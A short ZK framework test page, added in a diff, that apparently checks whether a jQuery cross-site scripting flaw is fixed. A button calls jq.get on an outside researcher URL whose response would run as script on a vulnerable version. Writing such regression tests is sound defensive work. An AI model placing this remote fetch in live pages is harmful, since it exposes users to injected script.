@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+B91-ZK-4557.zul
+
+		Purpose:
+		
+		Description:
+		
+		History:
+				Mon Apr 27 17:04:42 CST 2020, Created by leon
+
+Copyright (C) 2020 Potix Corporation. All Rights Reserved.
+
+-->
+<zk xmlns:w="client">
+	<label>
+		click the button, you should not see any browser alert popup.
+	</label>
+	<separator/>
+	<button label="jq XSS test" w:onClick="jq.get('http://sakurity.com/jqueryxss')"/>
+</zk>
